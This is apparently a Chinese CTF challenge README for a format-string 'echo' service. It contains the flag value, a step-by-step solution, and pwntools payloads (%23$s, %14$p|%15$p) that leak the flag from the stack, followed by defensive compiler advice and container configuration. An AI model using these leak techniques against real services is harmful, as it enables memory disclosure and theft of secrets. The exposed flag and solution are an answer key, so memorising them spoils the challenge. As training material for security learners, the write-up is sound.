# pwn-fmt-leak

## 一、题目与考点

| 项 | 值 |
|---|---|
| 难度 | 易 |
| 考点 | `printf(buf)` 格式化字符串漏洞；位置参数 `%N$p` / `%N$s`；栈上数据布局 |
| 容器端口 | 宿主机 9103 → 容器 1337 |
| Flag | `flag{format_string_leaks_the_stack}` |

## 题面（直接复制到平台「简介」）

一个小巧的"回声"服务：你发一句话，它把这句话回给你。用 `nc <地址> 9103` 连上去，会看到 `Say something:`。目标：flag 已经在进程内存里，把它读出来。

**提示**：它打印你这句话时走的是哪个函数？`objdump -d` 里看这次调用在参数寄存器里放了几个值。

## 二、题目描述

```
nc <host> 9103
Say something:
```

`main` 把 `/app/flag` 读进一个栈上的 `char flag[64]`，再 `fgets` 读入 `char buf[64]`，
然后 `printf(buf)`，格式化串完全由输入决定。

## 三、解题步骤

1. 确认漏洞：

```bash
objdump -d files/pwn | sed -n '/<main>:/,/ret/p'
```

```asm
40128a: call   4011d6 <load_flag>          # flag 在 [rbp-0x50]
4012c8: mov    rdi, rax   ; rax = &buf
4012cd: call   4010b0 <printf@plt>        # printf(buf)，没有格式串常量
```

`flag` 在 `rbp-0x50`，`buf` 在 `rbp-0x90`，另外 `char *leak = flag` 落在 `rbp-0x8`。

2. 定位位置参数下标。`printf(buf)` 的第 6 个位置参数就是调用者栈顶，也就是 `buf[0..7]`：

```bash
python3 - <<'EOF'
from pwn import *
p = remote('127.0.0.1', 9103)
p.recvuntil(b'Say something:')
p.sendline(b'|'.join(('%%%d$p' % i).encode() for i in range(1, 20)))
print(p.recvline())
EOF
```

第 1~5 个参数是寄存器里的残留值，第 6 个开始是 `buf`。`buf` 起点 `rbp-0x90`：

- `flag` 在 `rbp-0x50` → 下标 `6 + (0x90-0x50)/8 = 6 + 8 = 14`
- `&flag` 存在 `rbp-0x8` → 下标 `6 + (0x90-0x8)/8 = 6 + 17 = 23`

3. 两种打法：

```python
# 打法 A：%23$s 直接解引用栈上保存的 &flag
p.sendline(b'%23$s')

# 打法 B：%14$p %15$p 拿 16 字节十六进制，按小端拼回去
p.sendline(b'%14$p|%15$p')
```

4. 跑 exp：

```bash
python3 exp/exp.py
```

输出 `flag{...}`。

## 四、原理

`printf` 是变参函数。x86-64 SysV 约定：前 6 个整型/指针参数走 `rdi, rsi, rdx, rcx, r8, r9`，
其余从栈上取。`printf(buf)` 只有一个真实参数（`rdi = buf`），但格式化串里写 `%7$p`
时，`printf` 会把 `rsi` 当作第 1 个可变参数……第 6 个之后的全部从调用者的栈帧里读。

调用 `printf` 时 `rsp` 正好等于 `rbp-0x90`（`main` 的 `sub rsp,0x90`），
所以 `%6$p` 读到 `buf[0..7]`，往后每 8 字节对应下一个下标，
一路读到 `main` 的其它局部变量。`flag` 的内容就这样被当作"参数"打印出来。

`%n$s` 则把该位置的值当成指针解引用。`main` 里 `char *leak = flag` 这条语句让 `&flag`
常驻在 `rbp-0x8`，于是 `%23$s` 能直接把整串 flag 打印出来。

## 五、防御建议

- 永远写 `printf("%s", buf)`，不要写 `printf(buf)`。
- 编译期加 `-Wformat-security -Werror=format-security`：`printf(buf)` 会直接报错。
- 用 `-D_FORTIFY_SOURCE=2` 时部分用法会被拦住，但 `printf(buf)` 仍可能漏。
- 敏感数据（如 flag）不要放在同一栈帧里，减少被 `%p`/`%s` 扫到的面。

## 六、附件清单

| 文件 | 说明 |
|---|---|
| `files/pwn` | 与容器内一致的二进制 |
| `src/pwn.c` | 源码 |
| `exp/exp.py` | pwntools 脚本 |
| `Dockerfile` / `entrypoint.sh` / `docker-compose.yml` | 容器 |
| `checker/main.rx` | 判题脚本 |

`checksec`：

```
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
Stripped: No
```

关键信息：`main = 0x401249`，`flag` 在 `rbp-0x50`，`buf` 在 `rbp-0x90`，
泄露下标 `%14$p`（flag 内容）、`%23$s`（flag 指针）。

---

## 平台镜像配置（添加镜像时照这张表填）

| 字段 | 填什么 | 说明 |
|---|---|---|
| 容器名称 | `pwn-fmt-leak` | 与题目目录名、tar 文件名保持一致 |
| 镜像标签 | `<registry>/<bucket>/pwn-fmt-leak` | 仓库名取自 tar 文件名（去扩展名），上传后 UI 自动带出 |
| 镜像版本 | 上传后生成的 Unix 时间戳 | 下拉选最新那条，不要手填 |
| 镜像拉取策略 | `Always` | 与平台默认一致 |
| 服务描述 | Pwn/交互题（nc 连上去打） | 只是备注，不影响运行 |
| 传输协议 | `tcp` | 全库只有 TCP 服务 |
| 应用协议 | `raw` | 裸 TCP / SSH / socat 选 raw |
| **服务端口** | **`1337`** | 容器内实际监听端口，必须与 Dockerfile 的 `EXPOSE` 一致 |
| CPU 限制 | `0.1, 0.3` | 最小, 最大（核） |
| 内存限制（MB） | `64, 128` | 最小, 最大 |
| 存储限制（MB） | `64, 1024` | 最小, 最大 |
| restricted | **勾选** | 平台会 drop `NET_BIND_SERVICE`，所以容器监听的是 `1337` 而不是 80 |
| 出网 | **关闭** | 本题不需要外网 |

> 端口必须填 **1337**。这是 socat / 裸 TCP 服务的监听端口，选手用 `nc <地址> <映射端口>` 连。
